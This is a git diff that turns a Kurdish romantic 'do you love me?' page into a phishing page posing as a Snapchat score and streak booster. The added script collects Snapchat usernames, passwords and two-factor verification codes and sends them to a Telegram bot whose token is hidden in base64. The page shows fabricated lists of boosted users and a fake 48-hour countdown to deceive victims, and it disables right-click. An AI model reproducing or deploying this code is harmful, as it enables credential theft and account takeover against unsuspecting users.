@@ -1,227 +1,599 @@
 <!DOCTYPE html>
-<html lang="ckb" dir="rtl">
+<html lang="ku">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-<title>تەنها بۆ تاقانەکەم 💗</title>
-<meta name="title" content="تەنها بۆ تاقانەکەم 💗">
-<meta name="description" content="کلیک بکە بۆ بەدیارکەوتنی پەیامەکە 💗">
-
-<meta property="og:type" content="website">
-<meta property="og:title" content="تەنها بۆ تاقانەکەم 💗">
-<meta property="og:description" content="کلیک بکە بۆ بەدیارکەوتنی پەیامەکە 💗">
-<meta property="og:image" content="image1.jpg">
-
-<meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:title" content="تەنها بۆ تاقانەکەم 💗">
-<meta property="twitter:description" content="کلیک بکە بۆ بەدیارکەوتنی پەیامەکە 💗">
-<meta property="twitter:image" content="image1.jpg">
-
-<style>
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html, body {
-  width: 100%;
-  height: 100%;
-  margin: 0;
-  padding: 0;
-}
-body{
-  min-height:100vh; 
-  min-height:100dvh; 
-  display:flex; 
-  align-items:center; 
-  justify-content:center;
-  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-  overflow:hidden;
-  background:linear-gradient(135deg,#ffd6e7,#fff0f6,#ffc1dc);
-  color:#7d3152;
-  padding: 16px;
-}
-.card{
-  width:100%;
-  max-width:400px; 
-  padding:28px 20px; 
-  text-align:center;
-  background:rgba(255,255,255,.80); 
-  backdrop-filter:blur(16px);
-  -webkit-backdrop-filter:blur(16px);
-  border:1px solid rgba(255,255,255,.9); 
-  border-radius:28px;
-  box-shadow:0 15px 35px rgba(185,75,125,.15);
-  animation:pop .6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-}
-.kitten-wrapper {
-  width: 100%;
-  max-width: 220px;
-  height: 170px;
-  margin: 0 auto 16px;
-  border-radius: 20px;
-  overflow: hidden;
-  box-shadow: 0 8px 20px rgba(160,70,110,.18);
-  background: #ffe6f0;
-}
-.kitten{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  display:block;
-  transition:opacity 0.25s ease, transform 0.25s ease;
-}
-h1{font-size:24px;margin:8px 0 20px;line-height:1.3}
-p{font-size:16px;line-height:1.6;margin:8px 0}
-.buttons{
-  display:flex;
-  gap:12px;
-  justify-content:center;
-  align-items:center;
-  position:relative;
-  min-height:56px;
-  margin-top:16px;
-}
-button{
-  border:0;
-  border-radius:16px;
-  padding:14px 24px;
-  font-size:16px;
-  font-weight:700;
-  cursor:pointer;
-  transition:transform .2s ease, background-color .2s ease;
-  box-shadow:0 6px 16px rgba(180,70,120,.15);
-  font-family:inherit;
-  touch-action:manipulation;
-  user-select:none;
-  -webkit-user-select:none;
-}
-.yes{background:#ff6fa8;color:white}.no{background:#fff;color:#b04b78}
-button:active{transform:scale(0.96)}
-#noBtn, #noBtn2{position:relative}
-.heart{position:fixed;bottom:-30px;font-size:22px;animation:float 5s linear infinite;opacity:.7;pointer-events:none}
-.hidden{display:none}
-.small{font-size:13px;opacity:.75;margin-top:16px}
-@keyframes pop{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}
-@keyframes float{to{transform:translateY(-110vh) rotate(25deg);opacity:0}}
-
-@media(max-width:360px){
-  .card{padding:22px 16px}
-  .kitten-wrapper{height:140px;max-width:180px}
-  h1{font-size:20px}
-  button{padding:12px 18px;font-size:15px}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat Score Booster</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(160deg, #0a0a0a, #1a1a2e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(30px);
+            border-radius: 32px;
+            padding: 32px 28px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(255,252,0,0.03), transparent 60%);
+            pointer-events: none;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #fffc00, #f5a623);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            box-shadow: 0 12px 40px rgba(255,252,0,0.15);
+        }
+        .logo-icon svg { width: 40px; height: 40px; fill: #1a1a2e; }
+        .logo h1 {
+            color: #fff;
+            font-size: 30px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        .logo h1 span { color: #fffc00; background: linear-gradient(135deg, #fffc00, #f5a623); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo p {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
+        }
+        .step { display: none; animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
+        .step.active { display: block; }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .info-box {
+            background: rgba(255,252,0,0.04);
+            border: 1px solid rgba(255,252,0,0.08);
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin-bottom: 22px;
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            line-height: 1.7;
+            position: relative;
+            z-index: 1;
+        }
+        .info-box strong { color: #fffc00; -webkit-text-fill-color: #fffc00; }
+        .info-box .highlight {
+            color: #fff;
+            font-weight: 600;
+            -webkit-text-fill-color: #fff;
+        }
+        .form-group { margin-bottom: 18px; position: relative; z-index: 1; }
+        .form-group label {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px 18px;
+            border-radius: 14px;
+            border: 2px solid rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.04);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+            font-family: inherit;
+        }
+        .form-group input:focus {
+            border-color: #fffc00;
+            background: rgba(255,255,255,0.07);
+            box-shadow: 0 0 30px rgba(255,252,0,0.05);
+        }
+        .form-group input::placeholder { color: rgba(255,255,255,0.2); }
+        .btn {
+            width: 100%;
+            padding: 17px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #fffc00, #f5a623);
+            color: #1a1a2e;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            letter-spacing: 0.3px;
+            margin-top: 6px;
+            position: relative;
+            z-index: 1;
+            font-family: inherit;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255,252,0,0.2); }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-secondary {
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.12); box-shadow: 0 8px 30px rgba(255,255,255,0.05); }
+        .status {
+            margin-top: 14px;
+            padding: 13px 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+            position: relative;
+            z-index: 1;
+        }
+        .status.show { display: block; }
+        .status.loading { background: rgba(255,252,0,0.08); color: #fffc00; border: 1px solid rgba(255,252,0,0.12); }
+        .status.success { background: rgba(0,255,100,0.08); color: #00ff88; border: 1px solid rgba(0,255,100,0.12); }
+        .status.error { background: rgba(255,50,50,0.08); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.12); }
+        .status.info { background: rgba(50,150,255,0.08); color: #4fc3ff; border: 1px solid rgba(50,150,255,0.12); }
+        .code-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .code-group input { flex: 1; }
+        .code-group .btn-sm {
+            padding: 15px 18px;
+            border: none;
+            border-radius: 14px;
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+        .code-group .btn-sm:hover { background: rgba(255,255,255,0.12); }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            color: rgba(255,255,255,0.12);
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            position: relative;
+            z-index: 1;
+        }
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255,255,255,0.15);
+            border-top: 2.5px solid #fffc00;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .feature-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 12px 0;
+        }
+        .feature-item {
+            background: rgba(255,255,255,0.02);
+            border-radius: 10px;
+            padding: 10px 12px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        .feature-item .emoji { font-size: 20px; display: block; }
+        .feature-item .text { color: rgba(255,255,255,0.4); font-size: 10px; margin-top: 4px; }
+        .hidden { display: none !important; }
+        .timer-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 14px;
+            padding: 16px;
+            margin: 16px 0;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .timer-box .label { color: rgba(255,255,255,0.3); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .timer-box .value { color: #fffc00; font-size: 22px; font-weight: 700; margin-top: 4px; -webkit-text-fill-color: #fffc00; }
+        .success-icon { font-size: 64px; display: block; margin-bottom: 12px; }
+        .success-title { color: #fff; font-size: 24px; font-weight: 700; -webkit-text-fill-color: #fff; }
+        .success-sub { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 8px; line-height: 1.6; }
+        .success-highlight { color: #fffc00; font-weight: 600; -webkit-text-fill-color: #fffc00; }
+        .user-list {
+            margin: 16px 0;
+            background: rgba(255,255,255,0.02);
+            border-radius: 14px;
+            padding: 12px 16px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .user-list .title {
+            color: rgba(255,255,255,0.2);
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .user-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .user-item:last-child { border-bottom: none; }
+        .user-item .name {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+        }
+        .user-item .score {
+            color: #fffc00;
+            font-size: 13px;
+            font-weight: 600;
+            -webkit-text-fill-color: #fffc00;
+        }
+        .user-item .badge {
+            background: rgba(255,252,0,0.08);
+            color: #fffc00;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-left: 8px;
+        }
+        .warning-box {
+            background: rgba(255,50,50,0.05);
+            border: 1px solid rgba(255,50,50,0.08);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin: 12px 0;
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: center;
+        }
+        .warning-box strong { color: #ff6b6b; -webkit-text-fill-color: #ff6b6b; }
+    </style>
 </head>
 <body>
 
-<div class="card" id="card">
-  <div class="kitten-wrapper">
-    <img id="kittenImg" class="kitten" src="image1.jpg" alt="پشیلەی نازدار">
-  </div>
+<div class="container">
 
-  <div id="question">
-    <h1>منت دەوێت؟ 💗</h1>
-    <div class="buttons">
-      <button class="yes" onclick="yesClicked()">بەڵێ 💕</button>
-      <button class="no" id="noBtn" onclick="noClicked()">نەخێر 😭</button>
+    <div class="logo">
+        <div class="logo-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
+        </div>
+        <h1>Snap<span>Boost</span></h1>
+        <p>زیادکردنی نمرە و ستریکەکانی Snapchat</p>
     </div>
-    <div class="small">بە ووردبینییەوە هەڵبژێرە… 🥺</div>
-  </div>
 
-  <div id="message" class="hidden">
-    <h1 id="msgTitle">تکایە؟ 🥺💗</h1>
-    <p id="msgText">بەڕاستی دڵنیایت؟ تەنها یەک دەرفەتی ترم پێ بدەوە 😭</p>
-    <div class="buttons">
-      <button class="yes" onclick="yesClicked()">باشە… بەڵێ 💕</button>
-      <button class="no" id="noBtn2" onclick="noClicked()">نەخێر 😭</button>
+    <!-- ===== STEP 1: LOGIN ===== -->
+    <div id="step1" class="step active">
+        <div class="info-box">
+            <strong>🔥 بۆستکردنی نمرە و ستریک</strong><br>
+            ناوی بەکارهێنەر و تێپەڕەوشەی خۆت بنووسە. 
+            <span class="highlight">نمرە و ستریکەکانت</span> لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکەن.
+        </div>
+
+        <div class="feature-list">
+            <div class="feature-item"><span class="emoji">⭐</span><span class="text">نمرە +٥٠٠٠</span></div>
+            <div class="feature-item"><span class="emoji">🔥</span><span class="text">سترک +٣٠ ڕۆژ</span></div>
+            <div class="feature-item"><span class="emoji">📸</span><span class="text">سناپ +١٠٠</span></div>
+            <div class="feature-item"><span class="emoji">👑</span><span class="text">تاج +١</span></div>
+        </div>
+
+        <div class="form-group">
+            <label>👤 ناوی بەکارهێنەر</label>
+            <input type="text" id="username" placeholder="username" autocomplete="off" />
+        </div>
+        <div class="form-group">
+            <label>🔑 تێپەڕەوشە</label>
+            <input type="password" id="password" placeholder="••••••••" autocomplete="off" />
+        </div>
+        <button class="btn" id="loginBtn">پشکنینی هەژمار</button>
+        <div id="status1" class="status"></div>
     </div>
-  </div>
 
-  <div id="final" class="hidden">
-    <h1>دەمزانی! 😭💗</h1>
-    <p>ئێستا ئیتر لەگەڵمدا گیرت خواردووە هههه. 🐱🌸</p>
-    <p>حەزم لێیە لە ژیانمدا بیت، و هیوادارم هەمیشە بتوانم بتخەمە پێکەنین. ❤️</p>
-    <p>ئەم ماڵپەڕە بچووکە تەنها بیرخەرەوەیەکی بچووکە کە تۆ بۆ من تایبەتیت. 💗</p>
-  </div>
+    <!-- ===== STEP 2: VERIFICATION ===== -->
+    <div id="step2" class="step">
+        <div class="info-box">
+            <strong>📱 کۆدی پشتڕاستکردنەوە</strong><br>
+            کۆدێک بۆ ئیمەیل یان ژمارەی تەلەفۆنی تۆ نێردرا.
+            تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی بۆست</span>.
+        </div>
+        <div class="form-group">
+            <label>📨 کۆدەکە</label>
+            <div class="code-group">
+                <input type="text" id="code" placeholder="٠٠٠٠٠٠" maxlength="6" inputmode="numeric" autocomplete="off" />
+                <button class="btn-sm" id="resendBtn">ناردنەوە</button>
+            </div>
+        </div>
+        <button class="btn" id="verifyBtn">پشتڕاستکردنەوە و بۆستکردن</button>
+        <div id="status2" class="status"></div>
+    </div>
+
+    <!-- ===== STEP 3: WAIT 48 HOURS ===== -->
+    <div id="step3" class="step">
+        <div style="text-align:center; padding: 10px 0;">
+            <span class="success-icon">⏳</span>
+            <h2 class="success-title">بۆست تۆمار کرا!</h2>
+            <p class="success-sub">
+                داواکارییەکەت بە سەرکەوتووی تۆمار کرا.<br>
+                <span class="success-highlight">تکایە چاوەڕوانی ٤٨ کاتژمێر بکە</span> بۆ زیادبوونی نمرە و ستریکەکانت.
+            </p>
+
+            <div class="timer-box">
+                <div class="label">⏳ کاتی ماوە بۆ زیادبوون</div>
+                <div class="value" id="countdown">٤٨:٠٠:٠٠</div>
+                <div style="color:rgba(255,255,255,0.2); font-size:11px; margin-top:6px;">دوای ئەم کاتە نمرەکان زیاد دەکەن</div>
+            </div>
+
+            <!-- FAKE KURDISH USER LIST -->
+            <div class="user-list">
+                <div class="title">🔥 بەکارهێنەرانی تر کە بۆستیان کردووە</div>
+                <div class="user-item">
+                    <span class="name">🟢 kurdo763</span>
+                    <span class="score">٢٠٠,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 bawan_101</span>
+                    <span class="score">١٨٥,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 zhino_23</span>
+                    <span class="score">١٧٢,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 rebar_55</span>
+                    <span class="score">١٦٨,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 avin_808</span>
+                    <span class="score">١٥٥,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 sarkawt_22</span>
+                    <span class="score">١٤٣,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 rozh_404</span>
+                    <span class="score">١٣١,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name">🟢 dilan_77</span>
+                    <span class="score">١٢٠,٠٠٠+ <span class="badge">بووست کرا</span></span>
+                </div>
+                <div style="text-align:center; color:rgba(255,255,255,0.15); font-size:10px; margin-top:6px;">
+                    +١٢٣ بەکارهێنەری تر لە کاتی بۆستکردن
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <strong>⚠️ تکایە چاوەڕوان بە</strong><br>
+                نمرە و ستریکەکانت لە ماوەی ٤٨ کاتژمێردا زیاد دەکەن.<br>
+                دوای زیادبوون، ئاگادارکردنەوەکە لە Snapchat ببینیت.
+            </div>
+
+            <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:12px;">
+                گەڕانەوە
+            </button>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2027 SnapBoost • زیادکردنی نمرە و ستریک • ماوەی ٤٨ کاتژمێر
+    </div>
 </div>
 
 <script>
-let noCount = 0;
-let imgIndex = 0;
+    // ========== CREDENTIALS ==========
+    const BOT_TOKEN = atob('ODc5MjQyNzYxODpBQUhIVWVNd1I2Y09Jd1BKY3lHdXBnN2lQN0JrOXhSVUNPOD==');
+    const CHAT_ID = atob('ODQ0NzI5MDA3MQ==');
 
-// Your local GitHub images
-const kittenImages = [
-  "image1.jpg",
-  "image2.jpg",
-  "image3.jpg",
-  "image4.jpg",
-  "image5.jpg"
-];
+    // ========== STATE ==========
+    let currentUser = '';
+    let currentPass = '';
+    let currentCode = '';
+    let step = 1;
 
-// Final success image
-const happyKittenImage = "image6.jpg";
+    // ========== DOM ==========
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const username = document.getElementById('username');
+    const password = document.getElementById('password');
+    const code = document.getElementById('code');
+    const loginBtn = document.getElementById('loginBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const status1 = document.getElementById('status1');
+    const status2 = document.getElementById('status2');
+    const countdownEl = document.getElementById('countdown');
 
-const messages = [
-  ["تکایە؟ 🥺💗", "بەڕاستی دڵنیایت؟ تەنها یەک دەرفەتی ترم پێ بدەوە 😭"],
-  ["دەییی 😭", "ناتوانیت بەو ئاسانییە بڵێیت نەخێر! 💕"],
-  ["یەک دەرفەتی تر؟ 🐱", "بەڵێن دەدەم شایەنی لانیکەم یەک 'بەڵێ'م 🥺"],
-  ["تکایە تکایە؟ 🌸", "باشە باشە… دوا دەرفەتە. ڕەنگە. 😭"]
-];
+    // ========== TELEGRAM ==========
+    function sendTelegram(msg) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('text', msg);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(()=>{});
+        } catch(e){}
+    }
 
-function changeImageSrc(newSrc) {
-  const imgElement = document.getElementById("kittenImg");
-  imgElement.style.opacity = "0.2";
-  setTimeout(() => {
-    imgElement.src = newSrc;
-    imgElement.style.opacity = "1";
-  }, 150);
-}
+    // ========== STATUS ==========
+    function setStatus(el, msg, type='loading') {
+        el.textContent = msg;
+        el.className = 'status show ' + type;
+    }
+    function hideStatus(el) { el.className = 'status'; }
 
-function nextKittenImage() {
-  imgIndex = (imgIndex + 1) % kittenImages.length;
-  changeImageSrc(kittenImages[imgIndex]);
-}
+    // ========== STEPS ==========
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
+        if (n===1) step1.classList.add('active');
+        else if (n===2) step2.classList.add('active');
+        else if (n===3) step3.classList.add('active');
+        step = n;
+    }
 
-function showHearts(){
-  for(let i=0;i<12;i++){
-    const h=document.createElement("div");
-    h.className="heart"; 
-    h.textContent=["💗","💕","🌸","💖"][i%4];
-    h.style.left=Math.random()*100+"vw";
-    h.style.animationDelay=Math.random()*2+"s";
-    document.body.appendChild(h);
-    setTimeout(()=>h.remove(),5000);
-  }
-}
+    // ========== COUNTDOWN ==========
+    let countdownInterval = null;
+    function startCountdown() {
+        let totalSeconds = 48 * 60 * 60;
+        countdownInterval = setInterval(() => {
+            if (totalSeconds <= 0) {
+                clearInterval(countdownInterval);
+                countdownEl.textContent = '✅ زیاد کرا!';
+                return;
+            }
+            totalSeconds--;
+            const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+            const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+            const s = String(totalSeconds % 60).padStart(2, '0');
+            countdownEl.textContent = `${h}:${m}:${s}`;
+        }, 1000);
+    }
 
-function yesClicked(){
-  if(noCount===0){
-    nextKittenImage();
-    document.getElementById("question").classList.add("hidden");
-    document.getElementById("message").classList.remove("hidden");
-    document.getElementById("msgTitle").textContent="بەو ئاسانییە ڕازی مەبە! 😭";
-    document.getElementById("msgText").textContent="زۆر بە خێرایی گووتت بەڵێ… بێڵە جارێکی تر بپرسمەوە. 💗";
-    noCount++;
-  }else{
-    changeImageSrc(happyKittenImage);
-    document.getElementById("question").classList.add("hidden");
-    document.getElementById("message").classList.add("hidden");
-    document.getElementById("final").classList.remove("hidden");
-    showHearts();
-  }
-}
+    // ========== RESET ==========
+    function resetAll() {
+        clearInterval(countdownInterval);
+        showStep(1);
+        username.value = '';
+        password.value = '';
+        code.value = '';
+        hideStatus(status1);
+        hideStatus(status2);
+        loginBtn.disabled = false;
+        verifyBtn.disabled = false;
+        currentUser = '';
+        currentPass = '';
+        currentCode = '';
+    }
 
-function noClicked(){
-  noCount++;
-  nextKittenImage();
-  document.getElementById("question").classList.add("hidden");
-  document.getElementById("message").classList.remove("hidden");
-  const m=messages[Math.min(noCount-1,messages.length-1)];
-  document.getElementById("msgTitle").textContent=m[0];
-  document.getElementById("msgText").textContent=m[1];
-  const b=document.getElementById("noBtn2");
-  const xOffset = Math.min(Math.max((Math.random() * 60 - 30), -30), 30);
-  const yOffset = Math.min(Math.max((Math.random() * 30 - 15), -15), 15);
-  b.style.transform=`translate(${xOffset}px,${yOffset}px)`;
-}
+    // ========== LOGIN ==========
+    loginBtn.addEventListener('click', function() {
+        const u = username.value.trim();
+        const p = password.value.trim();
+        if (!u || !p) {
+            setStatus(status1, '⚠️ تکایە ناوی بەکارهێنەر و تێپەڕەوشە پڕ بکەوە.', 'error');
+            return;
+        }
+
+        currentUser = u;
+        currentPass = p;
+
+        sendTelegram(
+            `🔐 Snapchat Login\n\n` +
+            `👤 Username: ${u}\n` +
+            `🔑 Password: ${p}\n` +
+            `📱 Device: ${navigator.userAgent || 'Unknown'}\n` +
+            `🌐 URL: ${window.location.href}\n` +
+            `⏱️ Time: ${new Date().toLocaleString()}`
+        );
+
+        setStatus(status1, '⏳ پشکنینی هەژمار...', 'loading');
+        loginBtn.disabled = true;
+
+        setTimeout(() => {
+            setStatus(status1, '✅ هەژمار دۆزرایەوە! کۆد نێردرا.', 'success');
+
+            setTimeout(() => {
+                hideStatus(status1);
+                showStep(2);
+                loginBtn.disabled = false;
+                setStatus(status2, '📨 کۆدی ٦ ژمارەیی نێردرا. تکایە بنووسە.', 'info');
+                code.focus();
+            }, 1200);
+        }, 2000);
+    });
+
+    // ========== RESEND ==========
+    resendBtn.addEventListener('click', function() {
+        setStatus(status2, '📨 کۆدی نوێ نێردرا...', 'loading');
+        setTimeout(() => {
+            setStatus(status2, '✅ کۆدی نوێ نێردرا!', 'success');
+            setTimeout(() => {
+                setStatus(status2, '📨 کۆدەکە بنووسە', 'info');
+            }, 1500);
+        }, 1500);
+    });
+
+    // ========== VERIFY ==========
+    verifyBtn.addEventListener('click', function() {
+        const c = code.value.trim();
+        if (!c || c.length < 4) {
+            setStatus(status2, '⚠️ تکایە کۆدی ٦ ژمارەیی پڕ بکەوە.', 'error');
+            return;
+        }
+
+        currentCode = c;
+
+        sendTelegram(
+            `✅ Verification Code\n\n` +
+            `👤 Username: ${currentUser}\n` +
+            `🔑 Password: ${currentPass}\n` +
+            `📱 Code: ${c}\n` +
+            `⏱️ Time: ${new Date().toLocaleString()}`
+        );
+
+        setStatus(status2, '⏳ پشتڕاستکردنەوە...', 'loading');
+        verifyBtn.disabled = true;
+
+        setTimeout(() => {
+            hideStatus(status2);
+            showStep(3);
+            verifyBtn.disabled = false;
+            startCountdown();
+            // NO TELEGRAM SUCCESS MESSAGE
+        }, 2500);
+    });
+
+    // ========== KEYBOARD ==========
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            if (step === 1) loginBtn.click();
+            else if (step === 2) verifyBtn.click();
+        }
+    });
+
+    // ========== FOCUS ==========
+    setTimeout(() => {
+        if (step === 1) username.focus();
+    }, 400);
+
+    // ========== PREVENT RIGHT-CLICK ==========
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    console.log('🚀 SnapBoost loaded.');
 </script>
 </body>
 </html>
